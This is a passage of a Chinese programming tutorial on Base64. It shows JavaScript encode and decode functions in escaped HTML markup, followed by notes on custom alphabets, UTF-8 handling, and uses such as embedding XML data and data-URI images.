            &lt;span class=&quot;nx&quot;&gt;aim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;base64EncodeDict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)])&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;aim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;aim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;base64EncodeDict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;charCodeAt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// 获取第三个字符
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;aim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;base64EncodeDict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;charCodeAt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)])&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;aim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;aim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;base64EncodeDict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;charCodeAt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;charCodeAt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)])&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;aim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;base64EncodeDict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;charCodeAt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;63&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;aim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;解码同理，我们需要将 4 个字节同时处理,也是用&amp;#34;与&amp;#34;,&amp;#34;左移&amp;#34;,&amp;#34;右移&amp;#34;来实现&lt;/p&gt;&lt;p&gt;&lt;b&gt;解码实现&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Base64Decode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;aim&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;aim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;baseDecodeDict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;baseDecodeDict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;aim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;baseDecodeDict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;baseDecodeDict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;aim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;baseDecodeDict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;aim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;baseDecodeDict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;baseDecodeDict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]))&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;aim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fromCharCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;运行测试：&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-b3250bf225fa7205b1a8ea4128097d2f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;617&quot; data-rawheight=&quot;287&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;617&quot; data-original=&quot;https://pic4.zhimg.com/v2-b3250bf225fa7205b1a8ea4128097d2f_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-b3250bf225fa7205b1a8ea4128097d2f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;617&quot; data-rawheight=&quot;287&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;617&quot; data-original=&quot;https://pic4.zhimg.com/v2-b3250bf225fa7205b1a8ea4128097d2f_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-b3250bf225fa7205b1a8ea4128097d2f_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;DIY 加密解密&lt;/b&gt;&lt;/p&gt;&lt;p&gt;上面提到的 base64 编码表，在整个编码解码过程中，我们可以看出来，编码表起着重要的作用，我们可以通过修改编码表，可以生成变异的 Base64 编码（相当于自己独一无二的加密方式）。&lt;/p&gt;&lt;p&gt;比如：CTF中流行的佛曰、百家姓等。。。&lt;/p&gt;&lt;p&gt;&lt;b&gt;多字节的 base64 编码&lt;/b&gt;&lt;/p&gt;&lt;p&gt;可能都看到了，这样的 base64 编码解码只能为单字节字符，一些双字节字符，比如中文、emoji 表情等，是如何进行 base64 编码解码的呢？&lt;/p&gt;&lt;p&gt;普遍的解决办法是将多字节字符进行 utf-8 编码为字符串，再进行 base64 编码，解码就与其相反。&lt;/p&gt;&lt;h2&gt;base64的常见使用✨&lt;/h2&gt;&lt;p&gt;再次认识一下，base64 编码的定义：被设计用来把任意序列的 8 位字节描述为一种不易被人直接识别的形式。&lt;/p&gt;&lt;p&gt;&lt;b&gt;为什么要使用 base64 编码？&lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;隐藏加密，其文本形式不易被人读取&lt;/li&gt;&lt;li&gt;加密算法复杂程度和效率&lt;/li&gt;&lt;li&gt;处理数据传输过程&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;b&gt;base64 使用案例&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;一：xml 中的数据处理&lt;/b&gt;&lt;/p&gt;&lt;p&gt;一个 xml 当中包含另一个 xml 的数据，此时如果将 xml 数据直接写入显然不合适，将 xml 进行适当进行编码存入较为方便，xml 当中的字符一般都是可见字符，但是由于存在中文字符，可能存在不可见字符，直接将字符打印在外层 xml 的数据中显然不合理，那么怎么办呢？&lt;/p&gt;&lt;p&gt;所以，基于这样的需求，我们可以使用base64进行编码，然后存入xml，解码反之&lt;/p&gt;&lt;p&gt;还有个办法，将 byte 的值写在 xml 当中，空格或者逗号分开，这样也可以将 byte 数据传入，不过这样更浪费空间，且不易保存。&lt;/p&gt;&lt;p&gt;&lt;b&gt;二：图片进行 base64 编码&lt;/b&gt;&lt;/p&gt;&lt;p&gt;图片的 base64 编码，就是将一副图片数据编码成一串字符串，使用该字符串代替图像地址。&lt;/p&gt;&lt;p&gt;&lt;b&gt;这样做有什么意义呢？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;要知道，我们所看到的网页上的每一个图片，都是需要消耗一个 http 请求下载而来的。没错，不管如何，图片的下载始终都要向服务器发出请求，要是图片的下载不用向服务器发出请求，而可以随着 HTML 的下载同时下载到本地那就太好了，而 base64 正好能解决这个问题。&lt;/p&gt;&lt;p&gt;&lt;b&gt;那么图片的 base64 编码长什么样子呢？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;举个栗子，知乎的登录页中扫码登录的入口图使用的就是base64编码。我们可以看到： &lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e45fabb20a78576cdc9d65a2d6ef6b5d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1596&quot; data-rawheight=&quot;979&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1596&quot; data-original=&quot;https://pic2.zhimg.com/v2-e45fabb20a78576cdc9d65a2d6ef6b5d_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e45fabb20a78576cdc9d65a2d6ef6b5d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1596&quot; data-rawheight=&quot;979&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1596&quot; data-original=&quot;https://pic2.zhimg.com/v2-e45fabb20a78576cdc9d65a2d6ef6b5d_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-e45fabb20a78576cdc9d65a2d6ef6b5d_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;在 css 和 html 中有所区别：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;//在css里的写法
xxx {
  background: url(data:image/gif;base64,xxx...xxx==) no-repeat center;
}
//在html代码img标签里的写法
